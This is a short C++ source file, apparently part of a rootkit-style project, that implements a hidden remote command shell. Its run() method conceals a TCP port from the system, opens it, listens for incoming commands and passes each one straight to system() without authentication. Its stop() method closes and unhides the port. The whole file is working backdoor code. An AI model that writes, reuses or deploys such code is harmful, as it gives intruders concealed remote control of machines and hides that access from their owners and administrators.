//
// Created by idan on 12/30/23.
//

#include <thread>
#include "hidden_remote_cli_shell.h"

#include "../../network_access/network_access.h"
#include "cli_shell_listener.h"
#include "../../hider/hider.h"


void hidden_remote_cli_shell::run() {

    hide_tcp4_port(my_port);
    open_tcp_port(my_port);

    // create a dummy tcp port listener for that port
    cli_shell_listener my_listener;

    // assign the connection establisher for the listener
    my_listener.setConnectionEstablisher(generate_tcp_port_connection_establisher(my_port));

//    std::thread listen_thread(&cli_shell_listener::listen, &my_listener);
//    auto func = [&my_listener]() -> void {
//        while (true) {
//            system(my_listener.pop_next_command().c_str());
//        }
//    };
//    std::thread exec_thread(func);
//    listen_thread.join();

    std::thread listen_thread(&cli_shell_listener::listen, &my_listener);
    while (true) {
        system(my_listener.pop_next_command().c_str());
    }
}

void hidden_remote_cli_shell::stop() {
    close_tcp_port(my_port);
    unhide_tcp4_port(my_port);
}
